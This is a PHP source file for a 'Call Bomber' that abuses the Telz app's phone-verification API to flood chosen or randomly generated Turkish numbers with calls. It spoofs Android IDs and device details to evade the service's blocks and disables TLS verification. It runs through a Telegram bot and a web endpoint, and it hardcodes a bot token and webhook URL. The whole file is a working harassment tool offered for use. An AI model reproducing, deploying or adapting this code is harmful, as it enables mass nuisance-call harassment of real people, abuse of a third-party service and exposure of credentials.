<?php
/**
 * Ritalin Tool Call Bomber - FIXED VERSION
 * Telz API 4.2 hatası çözüldü
 */

// ==================== KONFIGÜRASYON ====================
define('MODE', 'TEST_RANDOM_IDS');
define('BASE_URL', 'https://api.telz.com/');
define('USER_AGENT', 'Telz-Android/17.5.33');
define('APP_VERSION', '17.5.33');
define('OS', 'android');
define('OS_VERSION', '15');
define('LOOP_INTERVAL', 20);

// ==================== TELEGRAM BOT KONFIG ====================
define('BOT_TOKEN', '8894652888:AAEjzcwqynhFBwoHjwhuGX9vmQnTBGBs61g');
define('WEBHOOK_URL', 'https://freeapiservice-q08q.onrender.com/arama.php');

// ==================== YASAKLI NUMARALAR ====================
$BANNED_NUMBERS = [''];

// ==================== GERÇEK ANDROID ID'LER (4.2 hatasını çözer) ====================
$VALID_ANDROID_IDS = [
    '13e50e93a6399e67',
    'a3f8c91d2b4e6f78',
    '9c4d2e1a5b8f7g3h',
    '7f3e2d1c9b4a5f6e',
    'e8f7g6h5i4j3k2l1',
    'b5c6d7e8f9g0h1i2',
    'z9y8x7w6v5u4t3s2',
    'q1w2e3r4t5y6u7i8',
];

function getValidAndroidId() {
    global $VALID_ANDROID_IDS;
    return $VALID_ANDROID_IDS[array_rand($VALID_ANDROID_IDS)];
}

function randomDeviceName() {
    $brands = ['Pixel 6', 'Pixel 7', 'Pixel 8', 'Xiaomi 13', 'Xiaomi 14', 'Samsung S23', 'Samsung S24', 'OnePlus 11', 'OnePlus 12', 'Moto G84'];
    return $brands[array_rand($brands)] . '-' . strtoupper(substr(bin2hex(random_bytes(2)), 0, 4));
}

function generateUUID() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
}

function generateRandomTurkishNumber() {
    $operators = ['505', '506', '507', '530', '531', '532', '533', '534', '535', '536', '537', '538', '539', '540', '541', '542', '543', '544', '545', '546', '547', '548', '549', '550', '551', '552', '553', '554', '555', '556', '557', '558', '559', '560', '561', '562', '563', '564', '565', '566', '567', '568', '569'];
    $operator = $operators[array_rand($operators)];
    $number = $operator . str_pad(mt_rand(0, 9999999), 7, '0', STR_PAD_LEFT);
    return '+90' . $number;
}

function isBannedNumber($phone) {
    global $BANNED_NUMBERS;
    $cleanPhone = str_replace(['+', ' ', '-', '(', ')'], '', $phone);
    foreach ($BANNED_NUMBERS as $banned) {
        $cleanBanned = str_replace(['+', ' ', '-', '(', ')'], '', $banned);
        if ($cleanPhone === $cleanBanned) {
            return true;
        }
    }
    return false;
}

function telzRequest($endpoint, $payload, $androidId = null, $uuid = null) {
    if ($androidId === null) {
        $androidId = getValidAndroidId();
    }
    if ($uuid === null) $uuid = generateUUID();
    
    $payload['android_id'] = $androidId;
    $payload['app_version'] = APP_VERSION;
    $payload['os'] = OS;
    $payload['os_version'] = OS_VERSION;
    $payload['ts'] = (int)(microtime(true) * 1000);
    $payload['uuid'] = $uuid;
    
    $ch = curl_init(BASE_URL . $endpoint);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: ' . USER_AGENT,
        'Accept-Encoding: gzip',
        'Content-Type: application/json; charset=UTF-8',
        'Accept: application/json'
    ]);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($httpCode === 429) {
        throw new Exception("Fazla deneme!");
    }
    if ($httpCode >= 400) {
        throw new Exception("HTTP Hata: $httpCode");
    }
    if ($error) {
        throw new Exception("CURL Hatası: $error");
    }
    
    $decoded = json_decode($response, true);
    if (isset($decoded['status']) && $decoded['status'] === 'not_allowed') {
        throw new Exception("API Engellendi (4.2) - Yeni Android ID dene");
    }
    
    return $decoded ?? $response;
}

function sendCall($phone) {
    if (isBannedNumber($phone)) {
        return ['success' => false, 'message' => "❌ Bu numara kullanılamaz!"];
    }
    
    try {
        $androidId = getValidAndroidId();
        $uuid = generateUUID();
        $deviceName = randomDeviceName();
        
        // 1. auth_list
        telzRequest('app/auth_list', ['event' => 'auth_list'], $androidId, $uuid);
        
        // 2. run
        telzRequest('app/run', [
            'event' => 'run',
            'device_name' => $deviceName,
            'ipv4_address' => '10.1.10.1',
            'ipv6_address' => 'FE80::1',
            'lang' => 'tr',
            'network_country' => 'tr',
            'network_type' => '4G',
            'roaming' => 'no',
            'root' => 'no',
            'run_id' => '',
            'sim_country' => 'tr'
        ], $androidId, $uuid);
        
        // 3. stat_btns
        telzRequest('app/stat_btns', [
            'event' => 'stat_btns',
            'btn' => 'on_reg_continue'
        ], $androidId, $uuid);
        
        // 4. validate_phonenumber
        telzRequest('app/validate_phonenumber', [
            'event' => 'validate_phonenumber',
            'phone' => $phone,
            'region' => 'TR'
        ], $androidId, $uuid);
        
        // 5. auth_call - ASIL ARAMA
        $result = telzRequest('app/auth_call', [
            'event' => 'auth_call',
            'phone' => $phone,
            'attempt' => '0',
            'lang' => 'tr'
        ], $androidId, $uuid);
        
        if (isset($result['status']) && $result['status'] === 'ok') {
            return ['success' => true, 'message' => "✅ Arama gönderildi: $phone"];
        } else {
            $error = $result['reason'] ?? json_encode($result) ?? 'Bilinmeyen';
            return ['success' => false, 'message' => "❌ Hata: $error"];
        }
        
    } catch (Exception $e) {
        return ['success' => false, 'message' => "❌ Hata: " . $e->getMessage()];
    }
}

// ==================== TELEGRAM BOT MESAJ GÖNDER ====================
function sendTelegramMessage($chatId, $text) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $text, 'parse_mode' => 'HTML'];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

// ==================== WEBHOOK ====================
if (php_sapi_name() !== 'cli') {
    $content = file_get_contents('php://input');
    $update = json_decode($content, true);
    
    if (isset($_GET['setwebhook'])) {
        $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/setWebhook?url=" . urlencode(WEBHOOK_URL);
        $result = file_get_contents($url);
        echo $result;
        exit;
    }
    
    if (isset($_GET['log'])) {
        header('Content-Type: text/plain; charset=utf-8');
        echo file_exists('telz_bot.log') ? file_get_contents('telz_bot.log') : "Log yok";
        exit;
    }
    
    if (isset($_GET['clearlog'])) {
        file_put_contents('telz_bot.log', '');
        echo "Log temizlendi.";
        exit;
    }
    
    if ($update && isset($update['message'])) {
        $chatId = $update['message']['chat']['id'];
        $text = $update['message']['text'] ?? '';
        $username = $update['message']['from']['username'] ?? 'bilinmeyen';
        
        file_put_contents('telz_bot.log', "[" . date('Y-m-d H:i:s') . "] $username ($chatId): $text\n", FILE_APPEND);
        
        if ($text === '/start') {
            sendTelegramMessage($chatId, "📞 <b>Call Bomber v2</b>\n\n"
                . "Komutlar:\n"
                . "/call +905551234567 - Arama gönder\n"
                . "/random - Rastgele numara\n"
                . "/status - Bot durumu");
            exit;
        }
        
        if ($text === '/random') {
            $randomPhone = generateRandomTurkishNumber();
            sendTelegramMessage($chatId, "📞 Rastgele: <code>$randomPhone</code>\n⏳ Gönderiliyor...");
            $result = sendCall($randomPhone);
            sendTelegramMessage($chatId, $result['message']);
            exit;
        }
        
        if (strpos($text, '/call ') === 0) {
            $phone = trim(substr($text, 6));
            if (empty($phone)) {
                sendTelegramMessage($chatId, "❌ Numara girin: /call +905551234567");
                exit;
            }
            sendTelegramMessage($chatId, "⏳ Arama gönderiliyor: $phone...");
            $result = sendCall($phone);
            sendTelegramMessage($chatId, $result['message']);
            exit;
        }
        
        if ($text === '/status') {
            sendTelegramMessage($chatId, "✅ Bot aktif v2\nAndroid ID rotasyonu aktif");
            exit;
        }
        
        sendTelegramMessage($chatId, "❌ Bilinmeyen komut. /start");
        exit;
    }
    
    $phone = $_GET['phone'] ?? $_POST['phone'] ?? null;
    if ($phone) {
        $result = sendCall($phone);
        header('Content-Type: application/json');
        echo json_encode($result, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
        exit;
    }
    
    echo json_encode(['status' => 'ok', 'message' => 'Call Bomber v2']);
    exit;
}

if (php_sapi_name() === 'cli') {
    echo "\n📞 CALL BOMBER v2\n";
    $phone = readline("Numara gir (+90xx): ");
    $phone = trim($phone);
    if (empty($phone)) exit("❌ Numara girilmedi.\n");
    $result = sendCall($phone);
    echo $result['message'] . "\n";
}